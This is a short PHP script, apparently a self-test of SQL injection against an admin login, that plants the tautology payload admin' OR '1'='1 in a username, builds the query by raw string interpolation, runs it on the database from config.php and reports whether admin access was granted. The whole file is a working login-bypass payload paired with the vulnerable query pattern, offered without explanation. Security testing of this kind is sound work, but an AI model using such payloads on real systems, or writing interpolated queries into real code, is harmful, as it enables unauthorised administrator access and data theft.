<?php
require_once 'config.php';

// Test SQL injection on admin login
$username = "admin' OR '1'='1";
$password = "anything";

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password' AND role='admin'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    echo "SQL Injection successful! Admin access granted.";
} else {
    echo "SQL Injection failed.";
}
?>
